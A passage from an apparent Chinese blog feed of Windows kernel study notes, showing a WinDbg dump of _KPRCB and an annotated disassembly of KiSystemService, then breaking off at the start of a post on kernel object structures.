class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KPRCB</span><br><span class="line">ntdll!_KPRCB</span><br><span class="line">   +0x000 MinorVersion     : Uint2B</span><br><span class="line">   +0x002 MajorVersion     : Uint2B</span><br><span class="line">   +0x004 CurrentThread    : Ptr32 _KTHREAD</span><br><span class="line">   +0x008 NextThread       : Ptr32 _KTHREAD</span><br><span class="line">   +0x00c IdleThread       : Ptr32 _KTHREAD</span><br><span class="line">   +0x010 LegacyNumber     : UChar</span><br><span class="line">   +0x011 NestingLevel     : UChar</span><br><span class="line">   +0x012 BuildType        : Uint2B</span><br><span class="line">   +0x014 CpuType          : Char</span><br><span class="line">   +0x015 CpuID            : Char</span><br><span class="line">   +0x016 CpuStep          : Uint2B</span><br><span class="line">   +0x016 CpuStepping      : UChar</span><br><span class="line">   +0x017 CpuModel         : UChar</span><br><span class="line">   +0x018 ProcessorState   : _KPROCESSOR_STATE</span><br><span class="line">   +0x338 KernelReserved   : [16] Uint4B</span><br><span class="line">   +0x378 HalReserved      : [16] Uint4B</span><br><span class="line">   +0x3b8 CFlushSize       : Uint4B</span><br><span class="line">   +0x3bc CoresPerPhysicalProcessor : UChar</span><br><span class="line">   +0x3bd LogicalProcessorsPerCore : UChar</span><br><span class="line">   +0x3be PrcbPad0         : [2] UChar</span><br><span class="line">   +0x3c0 MHz              : Uint4B</span><br><span class="line">   +0x3c4 CpuVendor        : UChar</span><br><span class="line">   +0x3c5 GroupIndex       : UChar</span><br><span class="line">   +0x3c6 Group            : Uint2B</span><br><span class="line">   +0x3c8 GroupSetMember   : Uint4B</span><br><span class="line">   +0x3cc Number           : Uint4B</span><br><span class="line">   +0x3d0 PrcbPad1         : [72] UChar</span><br><span class="line">   +0x418 LockQueue        : [17] _KSPIN_LOCK_QUEUE</span><br><span class="line">   +0x4a0 NpxThread        : Ptr32 _KTHREAD</span><br><span class="line">   +0x4a4 InterruptCount   : Uint4B</span><br><span class="line">   +0x4a8 KernelTime       : Uint4B</span><br><span class="line">   +0x4ac UserTime         : Uint4B</span><br><span class="line">   +0x4b0 DpcTime          : Uint4B</span><br><span class="line">   +0x4b4 DpcTimeCount     : Uint4B</span><br><span class="line">   +0x4b8 InterruptTime    : Uint4B</span><br><span class="line">   +0x4bc AdjustDpcThreshold : Uint4B</span><br><span class="line">   +0x4c0 PageColor        : Uint4B</span><br><span class="line">   +0x4c4 DebuggerSavedIRQL : UChar</span><br><span class="line">   +0x4c5 NodeColor        : UChar</span><br><span class="line">   +0x4c6 PrcbPad20        : [2] UChar</span><br><span class="line">   +0x4c8 NodeShiftedColor : Uint4B</span><br><span class="line">   +0x4cc ParentNode       : Ptr32 _KNODE</span><br><span class="line">   +0x4d0 SecondaryColorMask : Uint4B</span><br><span class="line">   +0x4d4 DpcTimeLimit     : Uint4B</span><br><span class="line">   +0x4d8 PrcbPad21        : [2] Uint4B</span><br><span class="line">   +0x4e0 CcFastReadNoWait : Uint4B</span><br><span class="line">   +0x4e4 CcFastReadWait   : Uint4B</span><br><span class="line">   +0x4e8 CcFastReadNotPossible : Uint4B</span><br><span class="line">   +0x4ec CcCopyReadNoWait : Uint4B</span><br><span class="line">   +0x4f0 CcCopyReadWait   : Uint4B</span><br><span class="line">   +0x4f4 CcCopyReadNoWaitMiss : Uint4B</span><br><span class="line">   +0x4f8 MmSpinLockOrdering : Int4B</span><br><span class="line">   +0x4fc IoReadOperationCount : Int4B</span><br><span class="line">   +0x500 IoWriteOperationCount : Int4B</span><br><span class="line">   +0x504 IoOtherOperationCount : Int4B</span><br><span class="line">   +0x508 IoReadTransferCount : _LARGE_INTEGER</span><br><span class="line">   +0x510 IoWriteTransferCount : _LARGE_INTEGER</span><br><span class="line">   +0x518 IoOtherTransferCount : _LARGE_INTEGER</span><br><span class="line">   +0x520 CcFastMdlReadNoWait : Uint4B</span><br><span class="line">   +0x524 CcFastMdlReadWait : Uint4B</span><br><span class="line">   +0x528 CcFastMdlReadNotPossible : Uint4B</span><br><span class="line">   +0x52c CcMapDataNoWait  : Uint4B</span><br><span class="line">   +0x530 CcMapDataWait    : Uint4B</span><br><span class="line">   +0x534 CcPinMappedDataCount : Uint4B</span><br><span class="line">   +0x538 CcPinReadNoWait  : Uint4B</span><br><span class="line">   +0x53c CcPinReadWait    : Uint4B</span><br><span class="line">   +0x540 CcMdlReadNoWait  : Uint4B</span><br><span class="line">   +0x544 CcMdlReadWait    : Uint4B</span><br><span class="line">   +0x548 CcLazyWriteHotSpots : Uint4B</span><br><span class="line">   +0x54c CcLazyWriteIos   : Uint4B</span><br><span class="line">   +0x550 CcLazyWritePages : Uint4B</span><br><span class="line">   +0x554 CcDataFlushes    : Uint4B</span><br><span class="line">   +0x558 CcDataPages      : Uint4B</span><br><span class="line">   +0x55c CcLostDelayedWrites : Uint4B</span><br><span class="line">   +0x560 CcFastReadResourceMiss : Uint4B</span><br><span class="line">   +0x564 CcCopyReadWaitMiss : Uint4B</span><br><span class="line">   +0x568 CcFastMdlReadResourceMiss : Uint4B</span><br><span class="line">   +0x56c CcMapDataNoWaitMiss : Uint4B</span><br><span class="line">   +0x570 CcMapDataWaitMiss : Uint4B</span><br><span class="line">   +0x574 CcPinReadNoWaitMiss : Uint4B</span><br><span class="line">   +0x578 CcPinReadWaitMiss : Uint4B</span><br><span class="line">   +0x57c CcMdlReadNoWaitMiss : Uint4B</span><br><span class="line">   +0x580 CcMdlReadWaitMiss : Uint4B</span><br><span class="line">   +0x584 CcReadAheadIos   : Uint4B</span><br><span class="line">   +0x588 KeAlignmentFixupCount : Uint4B</span><br><span class="line">   +0x58c KeExceptionDispatchCount : Uint4B</span><br><span class="line">   +0x590 KeSystemCalls    : Uint4B</span><br><span class="line">   +0x594 AvailableTime    : Uint4B</span><br><span class="line">   +0x598 PrcbPad22        : [2] Uint4B</span><br><span class="line">   +0x5a0 PPLookasideList  : [16] _PP_LOOKASIDE_LIST</span><br><span class="line">   +0x620 PPNPagedLookasideList : [32] _GENERAL_LOOKASIDE_POOL</span><br><span class="line">   +0xf20 PPPagedLookasideList : [32] _GENERAL_LOOKASIDE_POOL</span><br><span class="line">   +0x1820 PacketBarrier    : Uint4B</span><br><span class="line">   +0x1824 ReverseStall     : Int4B</span><br><span class="line">   +0x1828 IpiFrame         : Ptr32 Void</span><br><span class="line">   +0x182c PrcbPad3         : [52] UChar</span><br><span class="line">   +0x1860 CurrentPacket    : [3] Ptr32 Void</span><br><span class="line">   +0x186c TargetSet        : Uint4B</span><br><span class="line">   +0x1870 WorkerRoutine    : Ptr32     void </span><br><span class="line">   +0x1874 IpiFrozen        : Uint4B</span><br><span class="line">   +0x1878 PrcbPad4         : [40] UChar</span><br><span class="line">   +0x18a0 RequestSummary   : Uint4B</span><br><span class="line">   +0x18a4 SignalDone       : Ptr32 _KPRCB</span><br><span class="line">   +0x18a8 PrcbPad50        : [56] UChar</span><br><span class="line">   +0x18e0 DpcData          : [2] _KDPC_DATA</span><br><span class="line">   +0x1908 DpcStack         : Ptr32 Void</span><br><span class="line">   +0x190c MaximumDpcQueueDepth : Int4B</span><br><span class="line">   +0x1910 DpcRequestRate   : Uint4B</span><br><span class="line">   +0x1914 MinimumDpcRate   : Uint4B</span><br><span class="line">   +0x1918 DpcLastCount     : Uint4B</span><br><span class="line">   +0x191c PrcbLock         : Uint4B</span><br><span class="line">   +0x1920 DpcGate          : _KGATE</span><br><span class="line">   +0x1930 ThreadDpcEnable  : UChar</span><br><span class="line">   +0x1931 QuantumEnd       : UChar</span><br><span class="line">   +0x1932 DpcRoutineActive : UChar</span><br><span class="line">   +0x1933 IdleSchedule     : UChar</span><br><span class="line">   +0x1934 DpcRequestSummary : Int4B</span><br><span class="line">   +0x1934 DpcRequestSlot   : [2] Int2B</span><br><span class="line">   +0x1934 NormalDpcState   : Int2B</span><br><span class="line">   +0x1936 DpcThreadActive  : Pos 0, 1 Bit</span><br><span class="line">   +0x1936 ThreadDpcState   : Int2B</span><br><span class="line">   +0x1938 TimerHand        : Uint4B</span><br><span class="line">   +0x193c LastTick         : Uint4B</span><br><span class="line">   +0x1940 MasterOffset     : Int4B</span><br><span class="line">   +0x1944 PrcbPad41        : [2] Uint4B</span><br><span class="line">   +0x194c PeriodicCount    : Uint4B</span><br><span class="line">   +0x1950 PeriodicBias     : Uint4B</span><br><span class="line">   +0x1958 TickOffset       : Uint8B</span><br><span class="line">   +0x1960 TimerTable       : _KTIMER_TABLE</span><br><span class="line">   +0x31a0 CallDpc          : _KDPC</span><br><span class="line">   +0x31c0 ClockKeepAlive   : Int4B</span><br><span class="line">   +0x31c4 ClockCheckSlot   : UChar</span><br><span class="line">   +0x31c5 ClockPollCycle   : UChar</span><br><span class="line">   +0x31c6 PrcbPad6         : [2] UChar</span><br><span class="line">   +0x31c8 DpcWatchdogPeriod : Int4B</span><br><span class="line">   +0x31cc DpcWatchdogCount : Int4B</span><br><span class="line">   +0x31d0 ThreadWatchdogPeriod : Int4B</span><br><span class="line">   +0x31d4 ThreadWatchdogCount : Int4B</span><br><span class="line">   +0x31d8 KeSpinLockOrdering : Int4B</span><br><span class="line">   +0x31dc PrcbPad70        : [1] Uint4B</span><br><span class="line">   +0x31e0 WaitListHead     : _LIST_ENTRY</span><br><span class="line">   +0x31e8 WaitLock         : Uint4B</span><br><span class="line">   +0x31ec ReadySummary     : Uint4B</span><br><span class="line">   +0x31f0 QueueIndex       : Uint4B</span><br><span class="line">   +0x31f4 DeferredReadyListHead : _SINGLE_LIST_ENTRY</span><br><span class="line">   +0x31f8 StartCycles      : Uint8B</span><br><span class="line">   +0x3200 CycleTime        : Uint8B</span><br><span class="line">   +0x3208 HighCycleTime    : Uint4B</span><br><span class="line">   +0x320c PrcbPad71        : Uint4B</span><br><span class="line">   +0x3210 PrcbPad72        : [2] Uint8B</span><br><span class="line">   +0x3220 DispatcherReadyListHead : [32] _LIST_ENTRY</span><br><span class="line">   +0x3320 ChainedInterruptList : Ptr32 Void</span><br><span class="line">   +0x3324 LookasideIrpFloat : Int4B</span><br><span class="line">   +0x3328 MmPageFaultCount : Int4B</span><br><span class="line">   +0x332c MmCopyOnWriteCount : Int4B</span><br><span class="line">   +0x3330 MmTransitionCount : Int4B</span><br><span class="line">   +0x3334 MmCacheTransitionCount : Int4B</span><br><span class="line">   +0x3338 MmDemandZeroCount : Int4B</span><br><span class="line">   +0x333c MmPageReadCount  : Int4B</span><br><span class="line">   +0x3340 MmPageReadIoCount : Int4B</span><br><span class="line">   +0x3344 MmCacheReadCount : Int4B</span><br><span class="line">   +0x3348 MmCacheIoCount   : Int4B</span><br><span class="line">   +0x334c MmDirtyPagesWriteCount : Int4B</span><br><span class="line">   +0x3350 MmDirtyWriteIoCount : Int4B</span><br><span class="line">   +0x3354 MmMappedPagesWriteCount : Int4B</span><br><span class="line">   +0x3358 MmMappedWriteIoCount : Int4B</span><br><span class="line">   +0x335c CachedCommit     : Uint4B</span><br><span class="line">   +0x3360 CachedResidentAvailable : Uint4B</span><br><span class="line">   +0x3364 HyperPte         : Ptr32 Void</span><br><span class="line">   +0x3368 PrcbPad8         : [4] UChar</span><br><span class="line">   +0x336c VendorString     : [13] UChar</span><br><span class="line">   +0x3379 InitialApicId    : UChar</span><br><span class="line">   +0x337a LogicalProcessorsPerPhysicalProcessor : UChar</span><br><span class="line">   +0x337b PrcbPad9         : [5] UChar</span><br><span class="line">   +0x3380 FeatureBits      : Uint4B</span><br><span class="line">   +0x3388 UpdateSignature  : _LARGE_INTEGER</span><br><span class="line">   +0x3390 IsrTime          : Uint8B</span><br><span class="line">   +0x3398 RuntimeAccumulation : Uint8B</span><br><span class="line">   +0x33a0 PowerState       : _PROCESSOR_POWER_STATE</span><br><span class="line">   +0x3468 DpcWatchdogDpc   : _KDPC</span><br><span class="line">   +0x3488 DpcWatchdogTimer : _KTIMER</span><br><span class="line">   +0x34b0 WheaInfo         : Ptr32 Void</span><br><span class="line">   +0x34b4 EtwSupport       : Ptr32 Void</span><br><span class="line">   +0x34b8 InterruptObjectPool : _SLIST_HEADER</span><br><span class="line">   +0x34c0 HypercallPageList : _SLIST_HEADER</span><br><span class="line">   +0x34c8 HypercallPageVirtual : Ptr32 Void</span><br><span class="line">   +0x34cc VirtualApicAssist : Ptr32 Void</span><br><span class="line">   +0x34d0 StatisticsPage   : Ptr32 Uint8B</span><br><span class="line">   +0x34d4 RateControl      : Ptr32 Void</span><br><span class="line">   +0x34d8 Cache            : [5] _CACHE_DESCRIPTOR</span><br><span class="line">   +0x3514 CacheCount       : Uint4B</span><br><span class="line">   +0x3518 CacheProcessorMask : [5] Uint4B</span><br><span class="line">   +0x352c PackageProcessorSet : _KAFFINITY_EX</span><br><span class="line">   +0x3538 PrcbPad91        : [1] Uint4B</span><br><span class="line">   +0x353c CoreProcessorSet : Uint4B</span><br><span class="line">   +0x3540 TimerExpirationDpc : _KDPC</span><br><span class="line">   +0x3560 SpinLockAcquireCount : Uint4B</span><br><span class="line">   +0x3564 SpinLockContentionCount : Uint4B</span><br><span class="line">   +0x3568 SpinLockSpinCount : Uint4B</span><br><span class="line">   +0x356c IpiSendRequestBroadcastCount : Uint4B</span><br><span class="line">   +0x3570 IpiSendRequestRoutineCount : Uint4B</span><br><span class="line">   +0x3574 IpiSendSoftwareInterruptCount : Uint4B</span><br><span class="line">   +0x3578 ExInitializeResourceCount : Uint4B</span><br><span class="line">   +0x357c ExReInitializeResourceCount : Uint4B</span><br><span class="line">   +0x3580 ExDeleteResourceCount : Uint4B</span><br><span class="line">   +0x3584 ExecutiveResourceAcquiresCount : Uint4B</span><br><span class="line">   +0x3588 ExecutiveResourceContentionsCount : Uint4B</span><br><span class="line">   +0x358c ExecutiveResourceReleaseExclusiveCount : Uint4B</span><br><span class="line">   +0x3590 ExecutiveResourceReleaseSharedCount : Uint4B</span><br><span class="line">   +0x3594 ExecutiveResourceConvertsCount : Uint4B</span><br><span class="line">   +0x3598 ExAcqResExclusiveAttempts : Uint4B</span><br><span class="line">   +0x359c ExAcqResExclusiveAcquiresExclusive : Uint4B</span><br><span class="line">   +0x35a0 ExAcqResExclusiveAcquiresExclusiveRecursive : Uint4B</span><br><span class="line">   +0x35a4 ExAcqResExclusiveWaits : Uint4B</span><br><span class="line">   +0x35a8 ExAcqResExclusiveNotAcquires : Uint4B</span><br><span class="line">   +0x35ac ExAcqResSharedAttempts : Uint4B</span><br><span class="line">   +0x35b0 ExAcqResSharedAcquiresExclusive : Uint4B</span><br><span class="line">   +0x35b4 ExAcqResSharedAcquiresShared : Uint4B</span><br><span class="line">   +0x35b8 ExAcqResSharedAcquiresSharedRecursive : Uint4B</span><br><span class="line">   +0x35bc ExAcqResSharedWaits : Uint4B</span><br><span class="line">   +0x35c0 ExAcqResSharedNotAcquires : Uint4B</span><br><span class="line">   +0x35c4 ExAcqResSharedStarveExclusiveAttempts : Uint4B</span><br><span class="line">   +0x35c8 ExAcqResSharedStarveExclusiveAcquiresExclusive : Uint4B</span><br><span class="line">   +0x35cc ExAcqResSharedStarveExclusiveAcquiresShared : Uint4B</span><br><span class="line">   +0x35d0 ExAcqResSharedStarveExclusiveAcquiresSharedRecursive : Uint4B</span><br><span class="line">   +0x35d4 ExAcqResSharedStarveExclusiveWaits : Uint4B</span><br><span class="line">   +0x35d8 ExAcqResSharedStarveExclusiveNotAcquires : Uint4B</span><br><span class="line">   +0x35dc ExAcqResSharedWaitForExclusiveAttempts : Uint4B</span><br><span class="line">   +0x35e0 ExAcqResSharedWaitForExclusiveAcquiresExclusive : Uint4B</span><br><span class="line">   +0x35e4 ExAcqResSharedWaitForExclusiveAcquiresShared : Uint4B</span><br><span class="line">   +0x35e8 ExAcqResSharedWaitForExclusiveAcquiresSharedRecursive : Uint4B</span><br><span class="line">   +0x35ec ExAcqResSharedWaitForExclusiveWaits : Uint4B</span><br><span class="line">   +0x35f0 ExAcqResSharedWaitForExclusiveNotAcquires : Uint4B</span><br><span class="line">   +0x35f4 ExSetResOwnerPointerExclusive : Uint4B</span><br><span class="line">   +0x35f8 ExSetResOwnerPointerSharedNew : Uint4B</span><br><span class="line">   +0x35fc ExSetResOwnerPointerSharedOld : Uint4B</span><br><span class="line">   +0x3600 ExTryToAcqExclusiveAttempts : Uint4B</span><br><span class="line">   +0x3604 ExTryToAcqExclusiveAcquires : Uint4B</span><br><span class="line">   +0x3608 ExBoostExclusiveOwner : Uint4B</span><br><span class="line">   +0x360c ExBoostSharedOwners : Uint4B</span><br><span class="line">   +0x3610 ExEtwSynchTrackingNotificationsCount : Uint4B</span><br><span class="line">   +0x3614 ExEtwSynchTrackingNotificationsAccountedCount : Uint4B</span><br><span class="line">   +0x3618 Context          : Ptr32 _CONTEXT</span><br><span class="line">   +0x361c ContextFlags     : Uint4B</span><br><span class="line">   +0x3620 ExtendedState    : Ptr32 _XSAVE_AREA</span><br></pre></td></tr></table></figure><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/7.png?x-oss-process=style/yangruiqi.com" alt="7"></p><p>最后面4个是保护模式下用不的到的，中断门在发生权限切换时候，会向0环的堆栈压入5个值，就是0x068到0x078，快速调用没有。<br>代码中push 0 ，就是0x64，errorcode，</p><p>下面是KiSystemServer的反汇编加注释，用到了上面的结构体：   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">.text:0043567E _KiSystemService proc near              ; CODE XREF: ZwAcceptConnectPort(x,x,x,x,x,x)+Cp</span><br><span class="line">.text:0043567E                                         ; ZwAccessCheck(x,x,x,x,x,x,x,x)+Cp ...</span><br><span class="line">.text:0043567E</span><br><span class="line">.text:0043567E arg_0           = dword ptr  4</span><br><span class="line">.text:0043567E</span><br><span class="line">.text:0043567E                 push    0               ; _KTRAP_FRAME +0x064 ErrCode</span><br><span class="line">.text:00435680                 push    ebp             ; 0x060 Ebp,3环寄存器入栈</span><br><span class="line">.text:00435681                 push    ebx             ; 0x05C,ebx</span><br><span class="line">.text:00435682                 push    esi             ; 0x058 Esi</span><br><span class="line">.text:00435683                 push    edi             ; 0x054 Edi</span><br><span class="line">.text:00435684                 push    fs              ; 0x050 SegFs</span><br><span class="line">.text:00435686                 mov     ebx, 30h        ; 为FS寄存器赋值,30就是段选择子，在GDTR找到相应的段描述符，加载到，FS，指向KPCR结构体</span><br><span class="line">.text:0043568B                 mov     fs, bx          ; Windows内核有个特殊的基本要求，就是只要CPU在内核运行，就得使</span><br><span class="line">.text:0043568B                                         ; mov ebx,30 //0011 0000  所以就是0环GDT索引6</span><br><span class="line">.text:0043568B                                         ; mov fs,bx</span><br><span class="line">.text:0043568B                                         ;</span><br><span class="line">.text:0043568B                                         ; 0环的FS.Base指向CPU自己的KPCR，不是指向当前线程</span><br><span class="line">.text:0043568B                                         ; 选择码，0x30的结构分析如下：</span><br><span class="line">.text:0043568B                                         ; 1.bit0~bit1:RPL,Requested Privilege Level,要求运行的级别，这里是0</span><br><span class="line">.text:0043568B                                         ; 2.bit2：找GDT还是IDT，这里是0，GDT</span><br><span class="line">.text:0043568B                                         ; 3.bit3！bit15，是在GDT或者IDT的下标</span><br><span class="line">.text:0043568B                                         ; windbg查看段描述符：834093f2 dc003748</span><br><span class="line">.text:0043568B                                         ; Base:83f2dc00 指向当前的_KPCR</span><br><span class="line">.text:0043568E                 mov     ebx, 23h</span><br><span class="line">.text:00435693                 mov     ds, ebx</span><br><span class="line">.text:00435695                 mov     es, ebx</span><br><span class="line">.text:00435697                 mov     esi, large fs:124h ; 查看下KPCR偏移124h是什么，查训发现是当前CPU所执行线程的_ETHREAD</span><br><span class="line">.text:0043569E                 push    large dword ptr fs:0 ; 保存老的ExceptionList</span><br><span class="line">.text:0043569E                                         ; _KPCR偏移+0x00-&gt;NT_TIB-&gt;ExceptionList</span><br><span class="line">.text:004356A5                 mov     large dword ptr fs:0, 0FFFFFFFFh ; 新的ExceptonList为空白，因为3环的异常链表，不能用，要进0环了</span><br><span class="line">.text:004356B0                 push    dword ptr [esi+13Ah] ; 因为Esi存的_KTHREAD,他的偏移13A存的PreviousMode,</span><br><span class="line">.text:004356B0                                         ; 就是保存老的先前模式到堆栈</span><br><span class="line">.text:004356B0                                         ; 先前模式就是当调用这些代码时候，原来是几环的数就是几，比如原来0环，先前模式就是0，原来3环就是1</span><br><span class="line">.text:004356B0                                         ; 因为有些内核代码可以从0和3调用，但是执行内容不一样，通过这个知道执行什么。</span><br><span class="line">.text:004356B6                 sub     esp, 48h        ; ESP 提升到_KTRAP_FRAME结构体第一个成员，也就是这个结构体指针</span><br><span class="line">.text:004356B9                 mov     ebx, [esp+68h+arg_0] ; 查了下这个位置是3环CS</span><br><span class="line">.text:004356B9                                         ; 所以这句是取出3环压入的参数CS _KTRAP_FRAME + 0x6C</span><br><span class="line">.text:004356BD                 and     ebx, 1          ; 上面的CS跟1与运算</span><br><span class="line">.text:004356BD                                         ; 0环最低位是0,3环最低位为1</span><br><span class="line">.text:004356C0                 mov     [esi+13Ah], bl  ; 上面的运算结果存到esi+0x13Ah这个位置的偏移，就是新的&quot;先前模式&quot;</span><br><span class="line">.text:004356C6                 mov     ebp, esp        ; 抬高栈针,ebp=esp=_KTRAP_FRAME指针</span><br><span class="line">.text:004356C8                 mov     ebx, [esi+128h] ; _KTHTEAD中的TrapFrame给ebx</span><br><span class="line">.text:004356CE                 mov     [ebp+3Ch], ebx  ; 将_KTHREAD中的Trap_Frame暂时存在这个位置后面</span><br><span class="line">.text:004356CE                                         ; //会将这个值取出来，重新恢复给_KTHREAD的Trap_Frame</span><br><span class="line">.text:004356CE                                         ;</span><br><span class="line">.text:004356CE                                         ; 零时存在这</span><br><span class="line">.text:004356D1                 and     dword ptr [ebp+2Ch], 0 ; Dr7清0</span><br><span class="line">.text:004356D5                 test    byte ptr [esi+3], 0DFh ; 查看当前线程是否处于调试状态</span><br><span class="line">.text:004356D5                                         ; 看看是不是-1，</span><br><span class="line">.text:004356D9                 mov     [esi+128h], ebp ; 因为有改变堆栈中的_KTRAP_FRAME,将其重新赋值给_KTHREAD中的TRAPFRAME</span><br><span class="line">.text:004356DF                 cld</span><br><span class="line">.text:004356E0                 jnz     Dr_kss_a        ; 处于调试的话跳转,跳转那边的代码是讲调试寄存器都存到Trap_Frame里</span><br><span class="line">.text:004356E6</span><br><span class="line">.text:004356E6 loc_4356E6:                             ; CODE XREF: Dr_kss_a+Dj</span><br><span class="line">.text:004356E6                                         ; Dr_kss_a+79j</span><br><span class="line">.text:004356E6                 mov     ebx, [ebp+60h]  ; 3环的Ebx给ebx</span><br><span class="line">.text:004356E9                 mov     edi, [ebp+68h]  ; 3环的Eip</span><br><span class="line">.text:004356EC                 mov     [ebp+0Ch], edx  ; edx存的3环参数指针：</span><br><span class="line">.text:004356EC                                         ;</span><br><span class="line">.text:004356EC                                         ; _kiFastSystemCall函数</span><br><span class="line">.text:004356EC                                         ;</span><br><span class="line">.text:004356EC                                         ; mov edx，esp</span><br><span class="line">.text:004356EC                                         ;</span><br><span class="line">.text:004356EC                                         ; sysenter</span><br><span class="line">.text:004356EF                 mov     dword ptr [ebp+8], 0BADB0D00h ; 这个是操作系统的标志</span><br><span class="line">.text:004356F6                 mov     [ebp+0], ebx    ; 3环的ebp存储到KTRAP_FRAME+0x000 DbgEbp的位置</span><br><span class="line">.text:004356F9                 mov     [ebp+4], edi    ; 3环的ebp存储到KTRAP_FRAME+0x004 DbgEip的位置</span><br><span class="line">.text:004356FC                 sti</span><br><span class="line">.text:004356FD                 jmp     loc_4357DF      ; 跳到KiFastCallEntry</span><br><span class="line">.text:004356FD _KiSystemService endp</span><br></pre></td></tr></table></figure><p>最后还是跳到了KiFastCallEntry，最后发现从两个口进来最后都要执行一样的代码</p><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>[1]：毛德操，《Windows内核情景分析》<br>[2]：滴水视频<br>[3]: 一大堆的别人的博客  </p>]]></content>
      
      <categories>
          
          <category> 笔记 - 系统调用笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统调用 </tag>
            
            <tag> 驱动学习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>object_Hook相关知识</title>
      <link href="/2018/06/28/object-Hook%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"/>
      <url>/2018/06/28/object-Hook%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
      <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h4 id="首先，分析OBJECT（内核对象）"><a href="#首先，分析OBJECT（内核对象）" class="headerlink" title="首先，分析OBJECT（内核对象）"></a>首先，分析OBJECT（内核对象）</h4><p>先找到一个进程内核对象的地址，使用!process 0 0查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PROCESS 885de030  SessionId: 1  Cid: 0700    Peb: 7ffd9000  ParentCid: 0418</span><br><span class="line">    DirBase: 7f3602e0  ObjectTable: 98a8c548  HandleCount:  60.</span><br><span class="line">    Image: Commnuication_ring3.exe</span><br></pre></td></tr></table></figure><p>然后查看最后一个这个进程   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">kd&gt; dt _OBJECT_HEADER 885de030-18</span><br><span 